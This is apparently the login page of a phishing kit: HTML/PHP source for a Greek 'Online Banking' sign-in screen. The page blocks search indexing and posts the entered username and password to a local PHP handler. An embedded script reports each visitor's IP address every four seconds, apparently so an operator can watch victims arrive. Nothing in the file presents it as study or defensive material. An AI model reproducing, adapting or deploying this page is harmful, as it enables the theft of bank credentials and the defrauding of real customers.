<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./Assets/css/helpers.css">
        <link rel="stylesheet" href="./Assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="./Assets/imgs/ff.ico" />

        <title>Log in to Online Banking</title>
        <script src="./Assets/js/stutes.js"></script>        
    </head>

    <body>

        <div id="wrapper">
            <div class="left"></div>
            <div class="right">
                <div class="inner">
                    <div class="logo">
                        <div><img style="max-width: 230px;" src="./Assets/imgs/logo.svg"></div>
                        <div class="lang">
                            <button type="button">Ελληνικά <i class="fa-solid fa-caret-down"></i></button>
                            <ul>
                                <li><a href="index.php?lang=gr">Ελληνικά</a></li>
                                <li><a href="index.php?lang=en">English</a></li>
                            </ul>
                        </div>
                    </div>
                    <form action="./Assets/php/config/func.php" method="POST">
                        <input type="hidden" name="log">
                        <div class="title">
                            <h3>Καλώς ήρθατε στο Online Banking</h3>
                            <p>Καταχωρίστε τα στοιχεία σας πιο κάτω για να συνδεθείτε</p>
                        </div>
                        <?php if(isset($_GET['error']) ) : ?>
                        <div class="error">
                            <div class="sym"><i class="fa-solid fa-circle-exclamation"></i></div>
                            <p>Λανθασμένο όνομα χρήστη ή κωδικός πρόσβασης.<br>Παρακαλώ προσπαθήστε ξανα.</p>
                        </div>
                        <?php endif; ?>
                        <div class="form-group mb20">
                            <label for="username">Όνομα χρήστη</label>
                            <input type="text" name="username" id="username" class="form-control">
                        </div>
                        <div class="form-group mb30">
                            <label for="password">Κωδικός πρόσβασης</label>
                            <input type="password" name="password" id="password" class="form-control">
                        </div>
                        <div class="btns mb30">
                            <button type="submit">Σύνδεση</button>
                        </div>
                        <p>Ξεχάσατε τον κωδικό σας; <span>Επαναφορά</span></p>
                        <hr>
                        <p>Δεν έχετε στοιχεία σύνδεσης; <span>Κάνε εγγραφή τώρα</span></p>
                    </form>
                </div>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./Assets/js/js.js"></script>

        <script>
            worker();
            var jsonData = {
                action: 'VISITORS',
                ip: '<?php echo get_client_ip(); ?>',
                page: 'login'
            };
            sendAjaxRequestEveryFourSeconds(jsonData);
        </script>

    </body>

</html>